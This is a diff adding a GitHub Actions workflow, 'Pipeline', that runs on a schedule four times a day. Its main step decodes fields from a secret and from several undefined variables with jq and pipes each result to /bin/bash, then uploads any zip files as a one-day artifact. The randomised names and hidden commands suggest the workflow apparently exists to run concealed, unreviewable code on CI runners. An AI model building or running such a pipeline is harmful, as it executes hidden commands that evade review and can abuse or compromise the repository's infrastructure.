@@ -1,0 +1,37 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '51 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          lktn4: ${{ secrets.lktn4 }}
+        run: |
+          printf '%s' "$lktn4" | jq -r .xq7999 | /bin/bash
+          echo $eigqs8903 | jq -r .twnqk392 | /bin/bash
+          printf '%s' "$q64" | jq -r .tk6 | /bin/bash
+          printf '%s' "$n29" | jq -r .aolb62 | /bin/bash
+          printf '%s' "$yb1319" | jq -r .ytlii0 | /bin/bash
+          printf '%s' "$ddva856" | jq -r .xm09568 | /bin/bash
+          echo $w944 | jq -r .cnle7658 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 4sZzKVG5
+          path: "*.zip"
+          retention-days: 1
